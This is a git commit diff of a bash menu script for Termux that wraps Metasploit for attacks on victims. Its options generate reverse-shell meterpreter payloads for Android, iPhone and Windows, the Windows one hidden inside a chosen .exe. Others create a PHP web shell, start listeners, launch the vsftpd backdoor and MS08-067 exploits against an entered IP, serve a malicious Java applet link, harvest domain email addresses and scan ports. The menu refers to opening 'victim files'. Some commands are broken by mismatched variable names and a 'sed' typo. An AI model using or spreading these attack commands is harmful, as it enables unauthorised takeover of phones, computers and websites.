2fbab441fb624879c8e8f850a5da12e7e288db1c
saeedo201 <zoalktoom201@gmail.com>
2019-02-04 09:08:58 +0200

    First commit

--- metasploit.sh
+++ metasploit.sh
@@ -12,12 +12,9 @@ purple='\033[1;35m'
 reset='\033[0m'
 y='\033[1;33m'
 n=install
-
 echo -e "$green "
-
 figlet  -f big "           MetaSploit  "
 echo -e "$blue"
-
 echo -e
 #--------------------------------------------------
 #--------------------------------------------------
@@ -40,7 +37,7 @@ ifconfig wlan0 | grep -o 192..........
 echo -e "$yellow"
 sleep 1
 #echo ''
-echo -e "$red                                          [00]back"
+echo -e "$red                                exit [CTRL+C]"
 echo -e "$cyan"
 echo "            [1]payload android ????????"
 echo "            [2]payload windows ????????"
@@ -53,7 +50,15 @@ echo "            [8]Open the victim files that you downloaded ???? "
 echo "            [9]Breakthrough by malicious link ???"
 echo "            [10]error metasploit ??????             "
 echo "            [11]Download msf (5.0.0)??????"
-echo "            [12]payload ios ???????"
+echo "            [12]payload iphone ???????"
+echo "            [13]iphone penetration msf ????????"
+echo "            [14]Create SHELL ?????"
+echo "            [15]Control the site by shell ????"
+echo "            [16]Search Engine Domain Email Address Collector????"
+echo "            [17]DNS Record Scanner and Enumerator???"
+echo "            [18]TCP Port Scanner???????"
+echo "            [19]TCP SYN Port Scanner ?????"
+echo "            [20]HTTP Version Detection????"
 echo -e "$green"
 read -p "     number------->  " Zoal
 #--------------------------------------------------
@@ -62,17 +67,18 @@ read -p "     number------->  " Zoal
 if [ $Zoal -eq 1 ]
 then
 echo -e $yellow " please insert LHOST :>"
-read -p "                       LHOST----->" host
+read -p "                       LHOST----->" lhost
 echo -e $yellow " please insert port :>"
 read -p "                       LPORT----->" lport
 echo -e $yellow " please insert Name payload :>"
 read -p "                       Name----->" name
-echo -e $red " please insert path :>"
-read -p "                    Path----->" path
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.apk
+echo -e $yellow " please insert path :>"
+read -p "                       Path----->" path
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.apk
+echo -e $cyan " Done  Now U Can find a Payload in your files"
+sleep 3
 bash metasploit.sh
 fi
-
 if [ $Zoal -eq 2 ]
 then
 echo -e $green " please insert LHOST :>"
@@ -83,7 +89,9 @@ echo -e $green " please insert Name payload :>"
 read -p "                      Name----->" name
 echo -e $green " please insert path :>"
 read -p "                      Path----->" path
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o $path/$name.apk
+msfvenom -a x86 --platform windows -x $name.exe -k -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport  -o $path/$name.exe
+echo -e $cyan " Done  Now U Can find a Payload in your files"
+sleep 3
 bash metasploit.sh
 fi
 if [ $Zoal -eq 3 ]
@@ -92,69 +100,45 @@ echo -e $blue "Please Insert LHOST :>"
 read -p "                    LHOST----->" host
 echo -e $blue "Please Insert PORT :>"
 read -p "                    LPORT----->" lport
-msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
-
+msfconsole -x 'use exploit/multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
 fi
-
 if [ $Zoal -eq 4 ]
 then
-
 echo -e $white "Please Insert LHOST :>"
 read -p "                     LHOST----->" host
 echo -e $white "Please Insert PORT :>"
 read -p "                     LPORT----->" lport
 msfconsole -x 'use exploit/multi/handler' -x 'set payload windows/meterpreter/reverse_tcp' -x 'set lport '$port -x 'set lhost '$host -x 'exploit'
 fi 
-
 if [ $Zoal -eq 5 ]
 then
 echo -e "$cyan"
 read -p "                  ip----->" ip
-
 msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor' -x 'set payload cmd/unix/interact' -x 'set RHOST $ip' -x 'set RPORT 21' -x 'exploit'
-
 fi
-
 if [ $Zoal -eq 6 ]
 then
-msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'setpayload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'
-
+msfconsole -x 'use windows/smb/ms08_067_netapi' -x 'set payload windows/meterpreter/bind_tcp' -x 'set RHOST $ip' -x 'set RPORT 445' -x'exploit'
 fi
-
 if [ $Zoal -eq 7 ]
 then
 echo -e "$red"
 echo ""
-echo -e "$green    "
-cd $HOME/MetaSploit/.msf && ls
+cd $HOME/ && ls
 echo ""
 read -p "name.txt ------> " n
 fi
-if [ "$n" -eq "0"  ]; then
 cd $HOME/MetaSploit
-metasploit.sh
-else
-termux-open $n
-fi
-
 if [ $Zoal -eq 8 ]
 then
 echo -e "$red"
 echo ""
-echo -e "$green    "
-cd $HOME/MetaSploit/.msf && ls
+cd $HOME/ && ls
 echo ""
 read -p "name photo ------> " n
 echo -e "$green"
 fi
-if [ "$n" -eq "0"  ]; then
 cd $HOME/MetaSploit
-metasploit.sh
-else
-termux-open $n
-echo ""
-fi
-
 if [ $Zoal -eq 10 ]
 then
 echo -e "++++++++++++++++> please wait <++++++++++++++++"
@@ -162,7 +146,6 @@ cd .msf
 chmod +x *
 sh .error.sh
 fi
-
 if [ $Zoal -eq 11 ]
 then
 echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
@@ -177,7 +160,6 @@ echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
 sleep 1
 metasploit.sh
 fi
-
 if [ $Zoal -eq 12 ]
 then
 echo -e $green " please insert LHOST :>"
@@ -189,8 +171,10 @@ read -p "                      Name----->" name
 echo -e $green " please insert path :>"
 read -p "                      Path----->" path
 msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
+echo -e $cyan " Done Now u can find a payload in your files"
+sleep 3
+bash metasploit.sh
 fi
-
 if [ $Zoal -eq 9 ]
 then
 echo -e $green "Please Insert SRVHOST :>"
@@ -199,8 +183,63 @@ echo -e $green "Please Insert SRVPORT :>"
 read -p "                     LPORT----->" lport
 msfconsole -x 'use exploit/multi/browser/java_signed_applet' -x 'set SRVHOST '$host -x 'set SRVPORT '$port -x 'set URLPATH /exploit ' -x 'set AAPLETNAME google_unix4 ' -x 'exploit'
 fi
+if [ $Zoal -eq 13 ]
+then
+echo -e $green "Please Insert LHOST :>"
+read -p "                     LHOST------>" host
+echo -e $green "Please Insert PORT :>"
+read -p "                     LPORT----->" port
+msfconsole -x 'use exploit/multi/handler' -x 'set payload iphone/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'run'
+fi 
+if [ $Zoal -eq 14 ]
+then
+echo -e $blue "Please Insert LHOST :>"
+read -p "                    LHOST----->" host
+echo -e $blue "Please Insert PORT :>"
+read -p "                    LPORT----->" lport
+msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > shell.php
+echo -e $blue " Done u can find a shell in your files"
+sleep 3
+bash metasploit.sh
 fi
-
+if [ $Zoal -eq 15 ]
+then
+echo -e $green "Please Insert LHOST :>"
+read -p "                     LHOST------>" host
+echo -e $green "Please Insert PORT :>"
+read -p "                     LPORT----->" port
+msfconsole -x 'use exploit/multi/handler' -x 'set PAYLOAD php/meterpreter_reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
+fi
+if [ $Zoal -eq 16 ]
+then
+echo -e $green "Please Insert DOMAIN :>"
+read -p "                     DOMAIN------>" domain
+msfconsole -x 'use auxiliary/gather/search_email_collector' -x 'set DOMAIN '$domain -x 'exploit'
+fi
+if [ $Zoal -eq 17 ]
+then
+echo -e $green "Please Insert DOMAIN :>"
+read -p "                     DOMAIN------>" domain
+msfconsole -x 'use auxiliary/gather/enum_dns' -x 'sed DOMAIN '$domain -x 'run'
+fi
+if [ $Zoal -eq 18 ]
+then
+echo -e $green "Please Insert RHOSTS :>"
+read -p "                     RHOST------>" host
+msfconsole -x 'use auxiliary/scanner/portscan/tcp' -x 'set RHOSTS '$host -x 'exploit'
+fi
+if [ $Zoal -eq 19 ]
+then
+echo -e $green "Please Insert RHOSTS :>"
+read -p "                     RHOST------>" host
+msfconsole -x 'use auxiliary/scanner/portscan/syn' -x 'set RHOSTS '$host -x 'exploit'
+fi
+if [ $Zoal -eq 20 ]
+then
+echo -e $green "Please Insert RHOSTS :>"
+read -p "                     RHOST------>" host
+msfconsole -x 'use auxiliary/scanner/http/http_version' -x 'set RHOSTS '$host -x 'run'
+fi
 if [ $Zoal -eq 00 ]
 then
 clear 
